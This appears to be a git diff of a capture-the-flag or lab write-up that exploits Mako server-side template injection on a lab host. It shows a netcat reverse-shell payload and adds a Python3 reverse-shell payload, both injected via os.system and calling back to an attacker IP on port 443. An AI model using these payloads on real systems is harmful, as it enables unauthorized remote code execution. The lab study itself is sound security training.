@@ -27,6 +27,11 @@ gobuster dir -u 192.168.164.121 -w /usr/share/wordlists/dirb/common.txt
 
 - Here you can see it gives the api defination file.
 
+Format JSON using jq:
+```
+jq -r 'fromjson' escaped.json > clean.json
+```
+
 ```
             "request": {
               "body": {
@@ -136,6 +141,11 @@ So you can try reverse shell for netcat.
 
 ```
 ${self.module.cache.util.os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.226 443 >/tmp/f")}
+```
+
+- Try reverse shell for python3
+```
+${self.module.cache.util.os.system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.226\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])' > /tmp/f")}
 ```
 
 ![mako_reverse_shell_proof.txt_flag](images/mako_reverse_shell_proof.txt_flag.png) 
